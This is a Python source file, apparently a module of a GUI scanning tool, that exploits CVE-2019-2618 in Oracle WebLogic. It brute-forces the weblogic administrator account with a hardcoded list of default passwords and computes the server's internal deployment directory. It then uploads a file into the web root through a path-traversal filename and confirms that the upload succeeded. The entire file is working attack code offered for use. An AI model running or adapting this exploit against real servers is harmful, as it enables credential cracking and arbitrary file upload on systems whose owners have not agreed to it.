import requests
import sys, re
import traceback
from PyQt5.Qt import QThread,pyqtSignal



class CVE20192618(QThread):
    passwd = ['weblogic', 'weblogic1', 'weblogic10', 'weblogic123', 'Oracle@123']
    signal = pyqtSignal([str, str])
    def __init__(self, ip, port):
        super().__init__()
        self.ip = ip
        self.port = port

    def check(self,url):
        vuln_url = url + "/bea_wls_deployment_internal/DeploymentService"
        payload = "------WebKitFormBoundaryPZVT5lymen1556Ma\r\nContent-Disposition: form-data; name=\"file\"; filename=\"11.tmp\"\r\nContent-Type: text/html\r\n\r\n 12341234 \r\n\r\n------WebKitFormBoundaryPZVT5lymen1556Ma--"
        success = False
        for password in self.passwd:
            headers = {
            'content-type': "multipart/form-data; boundary=----WebKitFormBoundaryPZVT5lymen1556Ma",
            "username":"weblogic",
            "password":password,
            'wl_request_type': "app_upload",
            'wl_upload_application_name': "/",
            'archive': "true",
            }
            try:
                req = requests.post(url=vuln_url, data=payload,headers=headers)
                if "DeploymentService" not in req.text and req.status_code == 200 and '11.tmp' in req.text:
                    serverName = re.findall('/servers/(.*?)/upload/', req.text, re.S)[0]
                    self.signal[str, str].emit("[+] 口令爆破成功：weblogic/" + password, 'red')
                    self.signal[str, str].emit("[+] weblogic服务名：" + serverName, 'red')
                    path = self.get_path(serverName)
                    self.signal[str, str].emit("[+] 8位随机字符目录：" + path, 'red')
                    #print(Color.GREEN+"[+]CVE-2019-2618漏洞存在"+Color.ENDC)
                    self.testupload(url,password,path)
                    success = True
                    self.signal[str, str].emit('[+] CVE-2019-2618 漏洞存在', 'red')
                    break
                else:
                    self.signal[str, str].emit("[-] 口令爆破失败：weblogic/" + password, 'green')
                    pass
            except:
                #print("[-]口令请求异常:weblogic/" + password)
                traceback.print_exc()
                pass
        if True != success:
            self.signal[str, str].emit('[-] CVE-2019-2618 漏洞不存在', 'green')

        

    def testupload(self,url,password,path):
        vuln_url = url + "/bea_wls_deployment_internal/DeploymentService"
        headers = {
        'content-type': "multipart/form-data; boundary=----WebKitFormBoundaryPZVT5lymen1556Ma",
        "username":"weblogic",
        "password":password,
        'wl_request_type': "app_upload",
        'wl_upload_application_name': "..",
        'archive': "true",
        }
        shell = "21232f297a57a5a743894a0e4a801fc3"
        payload = "------WebKitFormBoundaryPZVT5lymen1556Ma\r\nContent-Disposition: form-data; name=\"file\"; filename=\"/tmp/_WL_internal/bea_wls_deployment_internal/{0}/war/test.tmp\"\r\nContent-Type: text/html\r\n\r\n {1} \r\n\r\n------WebKitFormBoundaryPZVT5lymen1556Ma--".format(path,shell)
        upload_path = url + "/bea_wls_deployment_internal/test.tmp"
        try:
            req = requests.post(url=vuln_url, data=payload,headers=headers)
            req = requests.get(upload_path)
            if req.status_code == 200:
                self.signal[str, str].emit('[+] 上传文件成功', 'red')
        except:
            self.signal[str, str].emit('[-] 上传文件失败', 'green')

    # 以下为webloigc服务8位随机字符目录计算代码
    def convert_n_bytes(self,n, b):
        bits = b * 8
        return (n + 2 ** (bits - 1)) % 2 ** bits - 2 ** (bits - 1)

    def convert_4_bytes(self,n):
        return self.convert_n_bytes(n, 4)

    def getHashCode(self,s):
        h = 0
        n = len(s)
        for i, c in enumerate(s):
            h = h + ord(c) * 31 ** (n - 1 - i)
        return self.convert_4_bytes(h)

    def toString(self,strs,radix):
        i = int(strs)
        digits = [
            '0' , '1' , '2' , '3' , '4' , '5' ,
            '6' , '7' , '8' , '9' , 'a' , 'b' ,
            'c' , 'd' , 'e' , 'f' , 'g' , 'h' ,
            'i' , 'j' , 'k' , 'l' , 'm' , 'n' ,
            'o' , 'p' , 'q' , 'r' , 's' , 't' ,
            'u' , 'v' , 'w' , 'x' , 'y' , 'z'
        ]
        buf = list(range(65))
        charPos = 64
        negative = int(strs) < 0
        if not negative:
            i = -int(strs)

        while (i<=-radix):
            buf[int(charPos)] = digits[int(-(i%radix))]
            charPos = charPos - 1
            i = int(i / radix)
        buf[charPos] = digits[int(-i)]
        if negative:
            charPos = charPos - 1
            buf[charPos] = '-'
        return (buf[charPos:charPos+65-charPos])

    def get_path(self,serverName):
        strings = "%s_%s_%s" % (serverName,"bea_wls_deployment_internal","bea_wls_deployment_internal.war")
        return "".join(self.toString(self.getHashCode(strings),36)).replace("-","")

    def run(self):
        url = 'http://'+str(self.ip)+':'+str(self.port)
        self.check(url)
